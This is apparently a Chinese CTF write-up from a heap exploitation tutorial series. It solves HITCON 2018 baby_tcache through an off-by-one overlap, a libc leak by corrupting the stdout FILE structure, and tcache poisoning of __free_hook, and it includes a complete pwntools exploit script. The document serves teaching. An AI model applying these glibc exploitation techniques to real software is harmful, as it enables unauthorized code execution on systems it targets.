    <content><![CDATA[<h1 id="pwn堆入门系列教程8"><a href="#pwn堆入门系列教程8" class="headerlink" title="pwn堆入门系列教程8"></a>pwn堆入门系列教程8</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span></p><p>这篇文章感觉算堆又不算堆，因为要结合到IO_FILE攻击部分，而且最主要是IO_FILE的利用，此题又学习到新的东西了，以前只玩过IO_FILE的伪造vtable,这次的leak方法第一次见</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="HITCON2018-baby-tcache"><a href="#HITCON2018-baby-tcache" class="headerlink" title="HITCON2018 baby_tcache"></a>HITCON2018 baby_tcache</h2><p>这道题我故意将其与tcache中的第一道题分开，因为这道题难度不在于tcache的攻击，而在于IO_FILE的利用，利用上一篇文章中的方法也很容易构造overlap，但libc却无法泄露，我自己纠结好久过后，还是看了wp</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>新建一个堆块，存在off-by-one</li><li>删除一个堆块</li><li>退出</li></ol><p>无leak函数</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C6B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_202060[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = <span class="number">0</span>;</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点很明显，off-by-one，在堆块重用机制下，会覆盖到下一个堆快的size部分</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>起初自己分析的时候做着做着忘了他没有leak，一股脑构造了个overlap，然后？？？我没有leak咋泄露啊，然后爆炸了，卡了很久都不知道怎么leak<br>看了别人的wp后发觉是利用IO_FILE泄露，以前没有接触过，所以这次记录下</p><h4 id="堆操作初始化"><a href="#堆操作初始化" class="headerlink" title="堆操作初始化"></a>堆操作初始化</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这个没啥好讲的，每次都得写</p><h4 id="这部分是构造overlap的"><a href="#这部分是构造overlap的" class="headerlink" title="这部分是构造overlap的"></a>这部分是构造overlap的</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>前面学过chunk extend部分，这部分应该很好理解，至于那里为什么是\x60\x06</p><blockquote><blockquote><blockquote><p>hex(0x500+0x30+0x40+0x50+0x60+0x40)<br>‘0x660’</p></blockquote></blockquote></blockquote><p>注意0x500这部分包括chunk的pre_size和size部分</p><p>计算的时候要算上chunk头部大小</p><h4 id="leak-libc-重点"><a href="#leak-libc-重点" class="headerlink" title="leak libc(重点)"></a>leak libc(重点)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x530</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">print(repr(info1))</span><br><span class="line">leak_libc = u64(info1)</span><br><span class="line">io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br></pre></td></tr></table></figure><ol><li>我们要将unsortbin移动到chunk2部分，所以总大小为0x500+0x30+0x10=0x540，所以malloc是0x530</li><li>delete(4)为了后面做准备</li><li>接下来要覆盖的后三位是0x760，这是不会改的，内存一个页是0x1000，后三位是固定的，所以需要爆破高位，我们爆破猜测为0，所以是0x0760，这里是chunk2的数据部分，本来是main_arena的数据的，现在修改他的低两个字节,需要改成<em>IO_2_1_stdout</em></li><li>tcache poisoning攻击</li><li>这里的为什么是fbad1800?以及0x3e大小，还有p64(0)如何来的？</li></ol><p>引用ctf-wiki</p><p>最终会调用到这部分代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)  </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                                <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                                <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>下面会以_IO_do_write相同的参数调用new_do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></span><br></pre></td></tr></table></figure><p>我们目的是调用到_IO_SYSWRITE，所以要bypass前面的检查，结合起来</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure><p>上面这部分ctf-wiki讲过了不在重复叙述，我当初纠结的是puts究竟是如何泄露libc的，<br>我们要用的是_IO_SYSWRITE(fp, data, to_do)<br>这个函数最终对应到函数 write(fp-&gt;fileno, data, to_do)<br>程序执行到这里就会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址。</p><p>这部分过程建议读读这篇文章，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区</p><p><span class="exturl" data-url="aHR0cDovL2RpdHRvenp6LnRvcC8yMDE5LzA0LzI0L0lPLUZJTEXpg6jliIbmupDnoIHliIbmnpDlj4rliKnnlKgv" title="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/">IO-FILE部分源码分析及利用<i class="fa fa-external-link"></i></span></p><p>所以会泄露出部分数据，逆着推导我们需要执行到这个函数，就需要bypass前面的检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                              <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                              <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">           f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了</p><p>在逆向回去就是flag检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>	<span class="comment">//高两个字节是magic不用管</span></span><br><span class="line">_flags &amp; = _IO_NO_WRITES = <span class="number">0</span></span><br><span class="line">_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">所以_flag的值为<span class="number">0x0</span>xfbad18*<span class="number">0</span>  *可以为任何数</span><br></pre></td></tr></table></figure><p>其实魔数部分改成什么都可以</p><p>原理讲通后就是测试了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，<br>后面接下来三个p64(0)覆盖</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure><p>最后覆盖一个低字节\x00到_IO_write_base，效果如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x7f00898f0760</span><br><span class="line">0x7f00898f0760 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad1800	0x0000000000000000</span><br><span class="line">0x7f00898f0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0780 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f00898f0700	0x00007f00898f07e3</span><br><span class="line">0x7f00898f0790 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f00898f07e3	0x00007f00898f07e3</span><br><span class="line">0x7f00898f07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f00898f07e4	0x0000000000000000</span><br><span class="line">0x7f00898f07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007f00898efa00</span><br><span class="line">0x7f00898f07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7f00898f07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007f00898f18c0</span><br><span class="line">0x7f00898f07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x00007f00898f0700</span><br><span class="line">0x7f00898f0700 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007f00898f18b0</span><br><span class="line">0x7f00898f0710 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7f00898f0720 &lt;_IO_2_1_stderr_+160&gt;:	0x00007f00898ef780	0x0000000000000000</span><br><span class="line">0x7f00898f0730 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0740 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>所以可以泄露出libc地址了</p><h4 id="tcache-poisoning攻击"><a href="#tcache-poisoning攻击" class="headerlink" title="tcache poisoning攻击"></a>tcache poisoning攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">    new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    new(<span class="number">0x530</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">    new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">    info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">    print(repr(info1))</span><br><span class="line">    leak_libc = u64(info1)</span><br><span class="line">    io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br><span class="line">    new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">    one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure><h3 id="调试总结"><a href="#调试总结" class="headerlink" title="调试总结"></a>调试总结</h3><p>这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用</p><h4 id="查看内存部分"><a href="#查看内存部分" class="headerlink" title="查看内存部分"></a>查看内存部分</h4><p>想gdb调试查看这部分内存的话<br>new(0x3e, p64(0xfbad1800)+ p64(0)*3 + ‘\x00’)，<br>不要在之后下断，之后查看的话看不到<br>可以在这句话之前下断</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b malloc</span><br><span class="line">finish</span><br><span class="line">n</span><br></pre></td></tr></table></figure><p>n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout</p><h4 id="gdb附加技巧"><a href="#gdb附加技巧" class="headerlink" title="gdb附加技巧"></a>gdb附加技巧</h4><p>这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口</p><h4 id="计算技巧"><a href="#计算技巧" class="headerlink" title="计算技巧"></a>计算技巧</h4><p>以前我经常用python计算offset，现在都是用gdb命令p addr1-addr2</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>IO_FILE攻击还是nb,能利用基本函数泄露出libc</li><li>自己构造起overlap起来还是有点吃力，以后要多练习这部分内容</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdGNhY2hlX2F0dGFjay16aC8=" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">ctf-wiki<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RpdHRvenp6LnRvcC8yMDE5LzA0LzI0L0lPLUZJTEXpg6jliIbmupDnoIHliIbmnpDlj4rliKnnlKgv" title="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/">IO-FILE部分源码分析及利用<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3BvbGx1eC5jYy8yMDE5LzA1LzAzLzIwMTgtaGl0Y29uLWJhYnktdGNhY2hlLw==" 